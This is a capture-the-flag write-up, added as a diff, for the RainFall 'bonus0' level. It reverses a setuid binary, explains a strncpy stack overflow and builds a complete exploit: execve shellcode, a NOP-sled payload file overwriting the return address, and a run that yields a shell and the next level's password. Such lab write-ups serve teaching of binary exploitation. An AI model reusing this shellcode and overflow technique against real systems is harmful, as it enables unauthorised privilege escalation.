@@ -1,0 +1,128 @@
+
+```bash
+bonus0@RainFall:~$ ls -la
+-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
+
+bonus0@RainFall:~$ file bonus0 
+bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xfef8b17db26c56ebfd1e20f17286fae3729a5ade, not stripped
+```
+
+Reversed in c:
+```c
+char *p(char *dest, char *s)
+{
+    char buf[4104];
+
+    puts(s);
+    read(0, buf, 4096);
+    *strchr(buf, '\n') = '\0';
+    return strncpy(dest, buf, 20);
+}
+
+char *pp(char *dest)
+{
+    char src[20];
+    char v3[28];
+    
+    p(src, " - ");
+    p(v3, " - ");
+    strcpy(dest, src);
+
+    *(unsigned short *)dest[strlen(dest)] = 0x0020; // write " \0" at the end of dest
+    return strcat(dest, v3);
+}
+
+int main(void)
+{
+    char s[42];
+
+    pp(s);
+    puts(s);
+    return 0;
+}
+```
+
+We see as the `read()` function call that user can input very large value `4096`
+But the `strncpy()` allow only `20` character to be copy
+
+After that, he `strcpy()` src in dest, puting at max 20 character with the `\0` on the `s` in `main()`
+After he replace the `\0` of `s` with a space character and `strcat()` the 2nd input in `s`
+
+The problem in this code is `strncpy()` because he place the `\0` only if it`s among the first n bytes
+
+If the input string is `20 bytes` long we can write the end of the string in `v3` and `strcpy` will copy `src` plus the part of `v3` with the nul symbol
+Alowing us to write 20 + 20 + 20 + 2(" \0") = 62 characters in total
+
+First we need to find the return pointer of `main()`:
+```bash
+bonus0@RainFall:~$ gdb bonus0
+(gdb) b main
+Breakpoint 1 at 0x80485a7
+(gdb) run
+Starting program: /home/user/bonus0/bonus0 
+
+Breakpoint 1, 0x080485a7 in main ()
+(gdb) x/2x $ebp
+0xbffff728:	0x00000000	0xb7e454d3
+```
+
+The return pointer of `main()` is at the address `0xbffff72c`
+First we gonna write a payload to take over the `eip` register
+
+```bash
+(gdb) run
+AAAAAAAAAAAAAAAAAAAA
+ - 
+BBBBBBBBBBBBBBCCCCD
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBCCCCD BBBBBBBBBBBBBBCCCCD
+Breakpoint 1, 0x080485ca in main ()
+(gdb) x/20x $esp
+0xbffff6e0:	0xbffff6f6	0x080498d8	0x00000001	0x0804835d
+0xbffff6f0:	0xb7fd13e4	0x41410016	0x41414141	0x41414141
+0xbffff700:	0x41414141	0x41414141	0x42424141	0x42424242
+0xbffff710:	0x42424242	0x42424242	0x43434343	0x42422044
+0xbffff720:	0x42424242	0x42424242	0x42424242	0x43434343
+```
+
+With that in mind we gonna write a shell code:
+Now we need to write the sheelcode to open `execve()`:
+```asm
+0:  31 c0                   xor    eax,eax      ; eax = 0
+2:  31 d2                   xor    edx,edx      ; edx == 0 (envp = NULL)
+4:  50                      push   eax          ; push 0 (NULL)  -- terminator for argv/envp
+5:  68 2f 2f 73 68          push   0x68732f2f   ; push "//sh"
+a:  68 2f 62 69 6e          push   0x6e69622f   ; push "/bin"
+f:  89 e3                   mov    ebx,esp      ; ebx -> "/bin//sh" (filename)
+11: 50                      push   eax          ; push NULL (argv terminator)
+12: 53                      push   ebx          ; push pointer to filename
+13: 89 e1                   mov    ecx,esp      ; ecx -> argv (pointer to array [filename, NULL])
+15: b0 0b                   mov    al,0xb       ; syscall number 11 = execve
+17: cd 80                   int    0x80         ; invoke kernel
+```   
+
+We can use so website (https://defuse.ca/online-x86-assembler.htm#disassembly) or compiler to get the shell code in a full string:
+"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+
+And we gonna inject this shell code in p() stack because we have a lot of space and it`s easy to manage:
+```bash
+rm -f /tmp/payload_bonus0
+printf '\x90%.0s' {1..100} > /tmp/payload_bonus0 # Padding NOP instruction
+echo -ne "\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" >> /tmp/payload_bonus0 # shell-code
+echo -ne "\x0A" >> /tmp/payload_bonus0 # New line
+printf 'B%.0s' {1..3970} >> /tmp/payload_bonus0 # padding
+printf 'A%.0s' {1..9} >> /tmp/payload_bonus0 # padding
+echo -ne "\xd0\xe6\xff\xbf" >> /tmp/payload_bonus0 # change the value of eip (0xbfffe6d0) to point where is the shell-code
+printf 'A%.0s' {1..7} >> /tmp/payload_bonus0 # padding
+echo -ne "\x0A" >> /tmp/payload_bonus0 # New line
+```
+
+And we run it:
+```bash
+bonus0@RainFall:~$ cat /tmp/payload_bonus0 - | ./bonus0
+ - 
+ - 
+��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
+
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
